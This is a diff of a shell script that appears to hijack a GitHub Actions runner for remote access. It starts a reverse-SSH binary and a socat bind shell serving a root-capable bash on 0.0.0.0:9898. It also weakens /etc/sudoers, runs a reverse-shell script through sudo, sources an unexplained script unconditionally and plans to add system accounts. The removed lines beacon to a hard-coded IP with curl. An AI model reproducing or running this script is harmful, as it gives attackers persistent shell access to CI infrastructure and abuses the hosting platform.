@@ -37,30 +37,18 @@ sudo touch /bin/bing;
 cp /tmp/busybox.bin /tmp/busybox &
 
 
-if [ ! -z ${sp9} ]; then 
-echo $sp9; 
-fi
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1z"
 
 if [ ! -z ${GITHUB_WORKSPACE} ]; then 
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1a"
 sudo chmod 0777 -R $GITHUB_WORKSPACE/ ;
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1b"
 [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&busybox setsid sudo -H $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
 [ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9898,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 fi
-
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=2"
-
 
 sudo bash -c ' mkdir /tmp/{A,aB};
 chmod 0777 /tmp/{A,aB};
 sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g" /etc/sudoers;
 grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9_sudo.txt
 '
-
-curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=3"
-
 
 
 # github_rev_ssh
@@ -88,14 +76,13 @@ curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=3"
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
 export HOME=/tmp;
-id;sleep 122;
 sudo -H su -l -c /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
 )
 
 # 无条件执行 
 . $GITHUB_WORKSPACE/cs45.sh  &
 
-id;sleep 124;
+
 
 #修改系统密码 添加系统账户tee chisel-60080  ttyd.x64
 grep -q "tee" /etc/passwd ||
@@ -111,7 +98,8 @@ grep -q wub /tmp/js9&&
 # . /home/runner/work/nc_test/nc_test/docker32; # thinkphp redis
 
 
-sleep 360;
+
+
 
 # npv和xrdp都具备
 grep -q NPV /tmp/js9&&grep -q xrdp /tmp/js9&&
@@ -195,6 +183,8 @@ a2enmod proxy_http;a2enmod proxy_fcgi;a2enconf php8.1-fpm;\
 systemctl restart apache2;
 '
 )&
+
+
 
 
 #  ls -al /etc/apache2/conf-enabled/php7.4-fpm.conf*;
